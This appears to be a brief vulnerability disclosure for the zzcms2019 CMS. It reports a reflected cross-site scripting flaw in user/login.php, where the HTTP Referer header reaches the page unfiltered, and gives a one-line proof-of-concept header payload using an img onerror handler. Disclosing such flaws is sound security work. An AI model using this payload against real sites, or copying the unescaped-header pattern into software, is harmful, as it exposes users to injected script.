
* version: zzcms2019
* referer: http://www.zzcms.net/about/6.htm
* issue: xss

## Position

in `zzcms2019/user/login.php line 24`：

The `@$_SERVER['HTTP_REFERER']` can be controlled by the Referer header, and it doesn't be filtered in `zzcms2019/inc/stopsqlin.php`:



## PoC

`Referer: xss"/><img src="#" onerror="alert(1)"/>`
